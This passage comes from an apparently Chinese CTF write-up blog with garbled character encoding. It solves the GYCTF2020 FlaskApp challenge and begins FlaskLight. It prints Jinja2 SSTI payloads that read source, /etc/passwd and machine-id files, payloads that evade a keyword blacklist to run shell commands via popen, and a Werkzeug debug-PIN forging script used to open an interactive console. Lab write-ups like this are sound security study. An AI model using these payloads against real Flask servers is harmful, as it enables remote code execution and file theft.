class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6070</span><br>https:<span class="hljs-regexp">//</span>exp10it.cn<span class="hljs-regexp">/2022/</span><span class="hljs-number">08</span><span class="hljs-regexp">/buuctf-web-writeup-4/</span><span class="hljs-comment">#suctf-2019pythonginx</span><br>https:<span class="hljs-regexp">//m</span>ayi077.gitee.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/05/</span>SUCTF-<span class="hljs-number">2019</span>-Pythonginx/<br>æœ‰å…³fileåè®®çš„æ–‡ç« ï¼šhttps:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/m0_46278037/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">113881347</span><br></code></pre></td></tr></table></figure><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>å‚è€ƒ<code>https://xz.aliyun.com/t/8092</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                   </p><p><img src="/img/flask1.png" alt="flask1"></p><p>æç¤ºï¼š</p><p><img src="/img/flask2.png" alt="flask2"></p><p><code>&lt;!-- PIN ---&gt;</code></p><p><code>Flask</code>æ¡†æ¶ï¼Œå®ç°<code>base64</code>çš„åŠ å¯†è§£å¯†åŠŸèƒ½ï¼Œåˆ†åˆ«åœ¨åŠ å¯†è§£å¯†ç•Œé¢è¾“å…¥<code>$&#123;7*7&#125;</code>ï¼š</p><p><img src="/img/flask3.png" alt="flask3"></p><p>å¼€å¯äº†<code>debug</code>æ¨¡å¼ï¼Œå­˜åœ¨éƒ¨åˆ†å’Œ<code>decode</code>æœ‰å…³çš„æºç ï¼š</p><p><img src="/img/flask4.png" alt="flask4"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>,<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br><br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>) : <span class="hljs-comment">#æ£€æŸ¥å½“å‰çš„HTTPè¯·æ±‚ä¸­æ˜¯å¦åŒ…å«äº†åä¸º&#x27;text&#x27;çš„å‚æ•°</span><br><br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br><br>        text_decode = base64.b64decode(text.encode()) <span class="hljs-comment">#çŒœæµ‹è¿™ä¸ªencodeå°±æ˜¯åˆ©ç”¨base64åŠ å¯†</span><br><br>        tmp = <span class="hljs-string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br><br>        <span class="hljs-keyword">if</span> waf(tmp) :<br><br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br><br>        res =  render_template_string(tmp) <span class="hljs-comment">#ä½¿ç”¨æ¨¡æ¿å¼•æ“æ¸²æŸ“tmp</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>tmp</code>ç»è¿‡<code>waf</code>åå°±é€ç»™æ¨¡æ¿å¼•æ“æ¸²æŸ“äº†ï¼Œä½†<code>waf</code>å…·ä½“æ˜¯æ€ä¹ˆä¸ªäº‹æˆ‘ä»¬ä¸çŸ¥é“ã€‚å¯ä»¥è¯•è¯•æŠŠ<code>$&#123;7*7&#125;</code>åŠ å¯†åå†æ”¾åˆ°<code>decode</code>é¡µé¢è§£å¯†ã€‚</p><p><img src="/img/flask5.png" alt="flask5"></p><p>è§¦å‘äº†<code>waf</code>ï¼Œåé¢å°è¯•äº†<code>&#123;&#123;1+1&#125;&#125;</code>ï¼ŒåŠ å¯†å†è§£å¯†å›æ˜¾äº†<code>2</code>ï¼Œç¡®å®å­˜åœ¨<code>SSTI</code>ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">å‚è€ƒäº†ä¸€äº›æœ‰å…³SSITçš„æ–‡ç« ï¼š<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">11090</span><span class="hljs-comment">#toc-2</span><br>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Article-kelp/</span>p/<span class="hljs-number">14797393</span>.html<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ç« ä¸­ç»™çš„<code>payload</code>è¯»æºç ï¼š</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&#123;config&#125;&#125;</code>å¯ä»¥è®¿é—®ï¼Œç›´æ¥<code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('app.py').read()&#125;&#125;</code>ä¹Ÿè¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template_string, render_template, request, flash, redirect, url_for<br><span class="hljs-keyword">from</span> flask_wtf <span class="hljs-keyword">import</span> FlaskForm<br><span class="hljs-keyword">from</span> wtforms <span class="hljs-keyword">import</span> StringField, SubmitField<br><span class="hljs-keyword">from</span> wtforms.validators <span class="hljs-keyword">import</span> DataRequired<br><span class="hljs-keyword">from</span> flask_bootstrap <span class="hljs-keyword">import</span> Bootstrap<br><span class="hljs-keyword">import</span> base64<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span><br>bootstrap = Bootstrap(app)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64åŠ å¯†&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;æäº¤&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm1</span>(<span class="hljs-title class_ inherited__">FlaskForm</span>)\:<br>    text = StringField(<span class="hljs-string">&#x27;BASE64è§£å¯†&#x27;</span>, validators=[DataRequired()])<br>    submit = SubmitField(<span class="hljs-string">&#x27;æäº¤&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>)\:<br>    black_list = [<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;chr&quot;</span>, <span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-string">&quot;subprocess&quot;</span>, <span class="hljs-string">&quot;commands&quot;</span>, <span class="hljs-string">&quot;socket&quot;</span>, <span class="hljs-string">&quot;hex&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;?&quot;</span>]<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list\:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower()\:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>()\:<br>    txt = <span class="hljs-string">&quot;å¤±è´¥ä¹ƒæˆåŠŸä¹‹æ¯ï¼ï¼&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;hint.html&quot;</span>, txt=txt)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64encode(text.encode())<br>        tmp = <span class="hljs-string">&quot;ç»“æœ \:&#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(text_decode.decode()))<br>        res = render_template_string(tmp)<br>        flash(tmp)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;encode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;åŠ å¯†&quot;</span>, img=<span class="hljs-string">&quot;flask.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/decode&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>()\:<br>    <span class="hljs-keyword">if</span> request.values.get(<span class="hljs-string">&#x27;text&#x27;</span>)\:<br>        text = request.values.get(<span class="hljs-string">&quot;text&quot;</span>)<br>        text_decode = base64.b64decode(text.encode())<br>        tmp = <span class="hljs-string">&quot;ç»“æœ ï¼š &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(text_decode.decode())<br>        <span class="hljs-keyword">if</span> waf(tmp)\:<br>            flash(<span class="hljs-string">&quot;no no no !!&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>        res = render_template_string(tmp)<br>        flash(res)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;decode&#x27;</span>))<br>    <span class="hljs-keyword">else</span>\:<br>        text = <span class="hljs-string">&quot;&quot;</span><br>        form = NameForm1(text)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>, form=form, method=<span class="hljs-string">&quot;è§£å¯†&quot;</span>, img=<span class="hljs-string">&quot;flask1.png&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&lt;name&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">not_found</span>(<span class="hljs-params">name</span>)\:<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;404.html&quot;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>\:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†<code>os</code>,<code>eval</code>,<code>popen</code>ã€‚ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å°±è¡Œï¼š</p><p><code>&#123;&#123;config.__class__.__init__.__globals__['o'+'s'].listdir('/')&#125;&#125;</code></p><p><img src="/img/flaskapp1.png" alt="flaskapp1"></p><p><code>&#123;&#123;config.__class__.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt').read()&#125;&#125;</code></p><p>å…¶å®<code>.æ–¹æ³•</code>å®Œå…¨å¯ä»¥é€šè¿‡<code>[]</code>æ›¿æ¢ï¼Œæ‰€ä»¥<code>payload</code>ä¹Ÿèƒ½æ¢æˆï¼š</p><p><code> &#123;&#123;config['__class__']['__init__']['__glo'+'bals__']['__builtins__']['e'+'val']("__im"+"port__('o'+'s').po"+"pen('cat /this_is_the_fl'+'ag.txt').read()")&#125;&#125;</code></p><p>ç¬¬äºŒç§æ–¹æ³•å°±æ˜¯ç”¨ä»–æç¤ºçš„<code>PIN</code>å»è§£é¢˜(<code>https://xz.aliyun.com/t/8092</code>)ï¼š</p><p><code>Flask å¦‚æœåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¼€å¯ debug æ¨¡å¼ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªäº¤äº’çš„ shell ,å¯ä»¥æ‰§è¡Œè‡ªå®šä¹‰çš„ python ä»£ç ã€‚åœ¨è¾ƒæ—§ç‰ˆæœ¬ä¸­æ˜¯ä¸ç”¨è¾“å…¥ PIN ç å°±å¯ä»¥æ‰§è¡Œä»£ç ï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­éœ€è¦è¾“å…¥ä¸€ä¸ª PIN ç ã€‚</code></p><p>å¦‚æœè¦æ„é€ <code>PIN</code>ç ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ä¸‹é¢è¿™äº›ä¿¡æ¯ï¼š</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br><span class="hljs-number">1</span>.usernameå¯ä»¥ä» <span class="hljs-regexp">/etc/</span>passwd ä¸­è¯»å–ã€‚<br><span class="hljs-number">2</span>.modname ä¸€èˆ¬é»˜è®¤flask.app<br><span class="hljs-number">3</span>.getattr(app, <span class="hljs-string">&#x27;__name__&#x27;</span>, getattr(app.__class__, <span class="hljs-string">&#x27;__name__&#x27;</span>))ä¸€èˆ¬é»˜è®¤ä¸º Flask<br><span class="hljs-number">4</span>.flaskä¸‹app.pyçš„ç»å¯¹è·¯å¾„ã€‚é€šè¿‡æŠ¥é”™ä¿¡æ¯å¾—åˆ°ã€‚<br><span class="hljs-number">5</span>.str(uuid.getnode()) MACåœ°å€ è¯»å–è¿™ä¸¤ä¸ªåœ°å€ï¼š<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0<span class="hljs-regexp">/address æˆ–è€… /</span>sys<span class="hljs-regexp">/class/</span>net<span class="hljs-regexp">/ens33/</span>address<br><span class="hljs-number">6</span>.æœ€åä¸€ä¸ªå°±æ˜¯æœºå™¨çš„idã€‚ å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨<span class="hljs-regexp">/etc/m</span>achine-idæˆ–<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œwindowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚<br>å¯¹äºdockeræœºåˆ™è¯»å–<span class="hljs-regexp">/proc/</span>self/cgroup<br><br><br>#å‚è€ƒï¼šhttps:<span class="hljs-comment">//xz.aliyun.com/t/8092#toc-2</span><br><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#å› ä¸ºæˆ‘ä»¬çŸ¥é“è¦è¯»çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Œç›´æ¥ç”¨openå°±è¡Œ<br><span class="hljs-number">1</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br>#æœ‰å¾ˆå¤šï¼Œä¸€èˆ¬è¦ä¹ˆæ˜¯rootè¦ä¹ˆæ˜¯æœ€åº•ä¸‹çš„flaskwebï¼Œè¯•ä¸€ä¸‹å°±è¡Œ<br><span class="hljs-number">2</span>.flask.app<br><span class="hljs-number">3</span>.Flask<br><span class="hljs-number">4</span>.<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>python3.<span class="hljs-number">7</span><span class="hljs-regexp">/site-packages/</span>flask/app.py<br><span class="hljs-number">5</span>. <span class="hljs-number">3</span>a:<span class="hljs-number">0</span>d:<span class="hljs-number">25</span>:ad:<span class="hljs-number">23</span>:<span class="hljs-number">12</span> #è¯»<span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/addresså°±è¡Œï¼Œç„¶å<span class="hljs-keyword">int</span>(<span class="hljs-string">&quot;3a0d25ad2312&quot;</span>,<span class="hljs-number">16</span>)è½¬æ¢æˆ<span class="hljs-number">10</span>è¿›åˆ¶ï¼š<span class="hljs-number">63828141089554</span><br><span class="hljs-number">6</span>.<br>&#123;% <span class="hljs-keyword">for</span> x in ().__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;warning&quot;</span> in x.__name__ %&#125;<br>&#123;&#123;x.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].open(<span class="hljs-string">&#x27;/etc/machine-id&#x27;</span>).<span class="hljs-keyword">read</span>() &#125;&#125;<br>&#123;%endif%&#125;<br>&#123;%endfor%&#125;<br># <span class="hljs-number">1408</span>f836b0ca514d796cbf8960e45fa1<br>è¿™é‡Œæˆ‘ç›´æ¥è¯»äº†<span class="hljs-regexp">/etc/m</span>achine-id<br><br>ç½‘ä¸Šçœ‹å…¶å®ƒå¸ˆå‚…å»è¯»çš„<span class="hljs-regexp">/proc/</span>self/cgroup(ç„¶åæ‰¾dockeråçš„å­—ç¬¦ä¸²,è¿™ä¸¤ä¸ªçœ‹ç€å¹¶ä¸ä¸€æ ·)<br>#d533bb8a3f0cd200ddb525a2ef04de18328f8cf780d71db3867a389664e27712<br><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ç« ä¸­çš„æ–¹æ³•ç”Ÿæˆ<code>pin</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;179143515503864&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span><br>    <span class="hljs-string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span><br>]<br><br>h = hashlib.md5()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br><br><span class="hljs-comment">#938-308-727</span><br></code></pre></td></tr></table></figure><p>åœ¨æŠ¥é”™ç•Œé¢ç‚¹å³ä¾§é‚£ä¸ªå°é»‘æ–¹æ¡†ï¼Œè¾“å…¥å¾—åˆ°çš„<code>PIN</code>å°±èƒ½è¿›å…¥äº¤äº’å¼ç»ˆç«¯äº†ï¼š</p><p><img src="/img/flaskapp7.png" alt="flaskapp7"></p><p>æ‹¿åˆ°<code>flag</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"># å…¶å®ƒpayloadï¼Œå‚è€ƒäº†https://blog.csdn.net/rfrder/article/details/110240245</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](<span class="hljs-name">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-name">&#x27;/&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-1],<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><img src="/img/flasklight1.png" alt="flasklight1"></p><p>ä¼°è®¡<code>SSTI</code>ï¼Œæºç ä¸­æœ‰å¦‚ä¸‹æç¤ºï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Parameter Name: search --&gt;</span><br><span class="hljs-comment">&lt;!-- Method: 